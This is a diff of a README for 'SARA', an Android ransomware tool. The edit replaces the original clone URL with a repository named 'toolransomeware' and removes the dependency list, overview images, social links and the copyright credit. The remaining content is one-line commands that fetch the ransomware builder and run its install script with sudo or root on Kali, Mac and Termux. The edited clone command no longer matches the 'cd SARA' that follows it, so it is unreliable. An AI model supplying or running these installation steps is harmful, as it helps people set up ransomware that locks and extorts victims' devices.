@@ -15,42 +15,14 @@ User can customize:
 ### Installation
 Quick installation for Ubuntu, Kali Linux, Darwin (MAC)
 ```bash
-git clone https://github.com/termuxhackers-id/SARA && cd SARA && sudo bash install.sh
+git clone https://github.com/nguyenduykhang17062009/toolransomeware && cd SARA && sudo bash install.sh
 ```
 
 Quick installation for Termux Android (ROOT)
 ````bash
 apt-get install tsu git imagemagick python -y && python3 -m pip install Pillow && git clone https://github.com/R1punk/SARA && cd SARA && tsu && bash installtermux.sh && python3 tehsara.py
 ````
-#### Sara for Termux by [@R1punk](https://github.com/R1punk/SARA)
-Tutorial on Termux Android [watch here](https://youtu.be/poXKCgaBg3c)
 
-### Dependencies
-- Java
-  - Openjdk 11
-- Aapt
-- Apktool
-  - Apktool 2.4.0
-- Zipalign
-- Imagemagick
-- Python3
-- Python3-pip
-  - Pillow
 
-### Tools overview
-<img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/view.jpg"></img>
-Need root access for ```Termux Android```
 
-### Ransomware overview
-<img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/ransomware.jpg"></img>
-Tested on devices ```Android 10```
 
-### Output logs
-<img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/outputlog.jpg"></img>
-
-### Support Us
-Facebook [@termuxhackers.id](https://fb.me/termuxhackers.id)<br>
-Instagram [@termuxhackers.id](https://instagram.com/termuxhackers.id)
-
-### Credit's
-Copyright © 2021 by [Termux Hackers](https://github.com/termuxhackers-id)
